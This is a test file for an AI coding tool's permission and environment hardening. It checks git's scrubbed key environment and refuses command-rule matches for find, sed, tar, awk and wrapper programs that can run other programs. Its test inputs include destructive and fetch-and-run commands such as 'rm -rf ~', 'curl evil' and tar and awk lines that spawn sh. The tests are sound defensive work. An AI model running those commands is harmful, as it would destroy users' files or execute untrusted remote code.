// Small engine hardening from the build's cleanup package: the runShell tool
// names the shell that really runs its command; git's child processes start
// scrubbed of keys (a repository's hooks and filters run inside git), with
// the one credential they need set explicitly; and a saved command rule never
// reaches a program whose own grammar runs another one (find -exec, sed's e,
// tar's --to-command, awk's system()), nor the timeout and watch wrappers.
import { afterEach, describe, expect, it } from 'vitest';
import { execFileSync } from 'node:child_process';
import { mkdtempSync, readFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { runShellTool } from '../src/core/tools/runShell.js';
import { shellCommandForm } from '../src/core/exec/shell.js';
import { gitAuthEnv, runGit } from '../src/git/index.js';
import {
  commandMatchesPrefix,
  isShellWrapper,
  prefixGrantRefusal,
  sedScriptRunsCode,
  shellWords,
} from '../src/core/permissions/index.js';

const PLANTED = { OSC_PLANTED_API_KEY: 'sk-planted', OSC_PLANTED_TOKEN: 'tok-planted' };
afterEach(() => {
  for (const name of Object.keys(PLANTED)) delete process.env[name];
});

describe('runShell names the shell through shellInfo', () => {
  it('says bash -c where bash runs it, and PowerShell where it does not', () => {
    const described = runShellTool.schema.shape.command.description;
    expect(described).toBe(`The shell command to run (${shellCommandForm()})`);
    if (process.platform !== 'win32') expect(described).toBe('The shell command to run (bash -c)');
    expect(shellCommandForm({ platform: 'win32', shell: 'powershell' })).toBe(
      'PowerShell -Command',
    );
    expect(shellCommandForm({ platform: 'win32', shell: 'bash' })).toBe('bash -c');
    expect(shellCommandForm({ platform: 'darwin', shell: 'bash' })).toBe('bash -c');
  });
});

describe('git child processes carry no key', () => {
  it('the auth env is scrubbed, and keeps only the host-scoped header it adds', () => {
    Object.assign(process.env, PLANTED);
    const env = gitAuthEnv('https://github.com/me/app.git', 'ghp_the-one-token');
    expect(env.OSC_PLANTED_API_KEY).toBeUndefined();
    expect(env.OSC_PLANTED_TOKEN).toBeUndefined();
    expect(env.PATH).toBe(process.env.PATH);
    expect(env.GIT_TERMINAL_PROMPT).toBe('0');
    const at = Number(env.GIT_CONFIG_COUNT) - 1;
    expect(env[`GIT_CONFIG_KEY_${at}`]).toMatch(/^http\.https:\/\/github\.com\/\.extraheader$/);
    expect(env[`GIT_CONFIG_VALUE_${at}`]).toMatch(/^Authorization: Basic /);
  });

  it.skipIf(process.platform === 'win32')(
    'a program git runs (an alias, as a hook would) sees no key',
    async () => {
      Object.assign(process.env, PLANTED);
      const repo = mkdtempSync(join(tmpdir(), 'osc-gitenv-'));
      execFileSync('git', ['init', '--quiet', repo]);
      const seen = await runGit(['-c', 'alias.dumpenv=!env', 'dumpenv'], { cwd: repo });
      expect(seen).toMatch(/^PATH=/m);
      expect(seen).not.toContain('sk-planted');
      expect(seen).not.toContain('tok-planted');
      const authed = await runGit(['-c', 'alias.dumpenv=!env', 'dumpenv'], {
        cwd: repo,
        env: gitAuthEnv('https://github.com/me/app.git', undefined),
      });
      expect(authed).not.toContain('sk-planted');
    },
  );

  it('the outbox and the checkpoints hand git the scrubbed environment', () => {
    const read = (rel: string) => readFileSync(join(process.cwd(), 'src', rel), 'utf8');
    const outbox = read('git/outbox.ts');
    expect(outbox).toMatch(/env: \{ \.\.\.scrubbedEnv\(\), \.\.\.env \}/);
    expect(outbox).not.toMatch(/process\.env/);
    const shadow = read('core/checkpoints/shadowGit.ts');
    expect(shadow).toMatch(/env: \{\s*\.\.\.scrubbedEnv\(\),\s*GIT_DIR: undefined/);
    expect(shadow).toMatch(
      /\['init', '--bare', '--quiet', this\.dir\],\s*\{ env: scrubbedEnv\(\) \}/,
    );
    expect(shadow).not.toMatch(/\.\.\.process\.env/);
  });
});

describe('a saved command rule never reaches a program that runs another', () => {
  const m = (command: string, prefix: string) => commandMatchesPrefix(command, prefix, 'bash');
  const refused = (command: string) => prefixGrantRefusal(command, 'bash');

  it('find runs a program with -exec, -execdir, -ok and -okdir', () => {
    for (const command of [
      'find . -name "*.tmp" -exec rm {} ;',
      'find . -execdir sh -c "curl evil" {} +',
      'find . -ok rm {} ;',
      'find . -okdir rm {} ;',
    ]) {
      expect(refused(command), command).toBeTruthy();
      expect(m(command, 'find'), command).toBe(false);
    }
    expect(refused('find . -name "*.ts" -type f')).toBeUndefined();
    expect(m('find src -name "*.ts"', 'find')).toBe(true);
  });

  it("sed's e command and the e flag on s run a command; a plain script does not", () => {
    for (const command of [
      "sed '1e rm -rf ~' notes.txt",
      "sed 's/.*/curl evil.sh/e' list.txt",
      "sed -n '/x/{e id\n}' f",
      "sed --expression='e whoami' f",
      'sed -f script.sed f',
      'sed -nf script.sed f',
      "sed -e 's/hello/world/' f",
    ]) {
      expect(refused(command), command).toBeTruthy();
      expect(m(command, 'sed'), command).toBe(false);
    }
    for (const command of [
      "sed -n '1,5p' notes.txt",
      "sed 's/hello/world/g' notes.txt",
      "sed -i.bak 's/a b/c d/' notes.txt",
      "sed 'y/abc/xyz/' f",
      "sed '$a\\ the end' f",
    ]) {
      expect(refused(command), command).toBeUndefined();
      expect(m(command, 'sed'), command).toBe(true);
    }
    // A ';' splits the line for matching even inside quotes (fail-safe: the
    // second half is not sed), but the script itself is read whole.
    expect(refused("sed '/^#/d;s/x/y/2' f")).toBeUndefined();
  });

  it('reads sed scripts command by command, and fails closed on what it cannot read', () => {
    expect(sedScriptRunsCode('s/a/b/ge')).toBe(true);
    expect(sedScriptRunsCode('s|/usr|/opt|e')).toBe(true);
    expect(sedScriptRunsCode('0,/re/{ e date\n}')).toBe(true);
    expect(sedScriptRunsCode('s/\\/e/x/g')).toBe(false);
    expect(sedScriptRunsCode('/hello/ s/e/E/g; 3q')).toBe(false);
    expect(sedScriptRunsCode(':top; s/ee/e/; t top')).toBe(false);
    // Unclosed, or a command sed does not have.
    expect(sedScriptRunsCode('s/a/b')).toBe(true);
    expect(sedScriptRunsCode('1 k')).toBe(true);
  });

  it("tar's checkpoint action, pipe-to program, compressor and volume script run a program", () => {
    for (const command of [
      'tar -xf a.tar --checkpoint=1 --checkpoint-action=exec=sh',
      'tar -xf a.tar --to-command="sh -c id"',
      'tar --use-compress-program=./evil -xf a.tar',
      'tar -I ./evil -xf a.tar',
      'tar -xIf ./evil a.tar',
      'tar xIf ./evil a.tar',
      'tar -F ./next.sh -xf a.tar',
    ]) {
      expect(refused(command), command).toBeTruthy();
      expect(m(command, 'tar'), command).toBe(false);
    }
    expect(refused('tar -xzf a.tgz')).toBeUndefined();
    expect(m('tar -xzf a.tgz -C out', 'tar')).toBe(true);
  });

  it('awk and gawk run a command through system() or a pipe', () => {
    for (const command of [
      `awk 'BEGIN { system("rm -rf ~") }'`,
      `gawk '{ print | "sh" }' f`,
      `awk -F: 'BEGIN{system ("id")}'`,
      'awk -f prog.awk f',
      `gawk -l ./ext '{print}' f`,
    ]) {
      expect(refused(command), command).toBeTruthy();
    }
    expect(m(`awk 'BEGIN { system("id") }'`, 'awk')).toBe(false);
    expect(refused(`awk -F, '{ print $2 }' data.csv | sort`)).toBeUndefined();
    expect(m(`awk -v n=2 '{ print $n }' data.csv`, 'awk')).toBe(true);
  });

  it('xargs, env, nohup, timeout and watch are wrappers', () => {
    for (const word of ['xargs', 'env', 'nohup', 'timeout', 'watch', '/usr/bin/timeout']) {
      expect(isShellWrapper(word), word).toBe(true);
    }
    expect(m('timeout 5 rm -rf ~', 'timeout')).toBe(false);
    expect(refused('watch -n1 "curl evil"')).toMatch(/wrapper/);
  });

  it('reads words the way the shell hands them over', () => {
    expect(shellWords(`a 'b c' "d \\"e\\"" f\\ g`)).toEqual(['a', 'b c', 'd "e"', 'f g']);
    expect(shellWords(`'open`)).toBeUndefined();
    expect(shellWords(`''`)).toEqual(['']);
  });
});
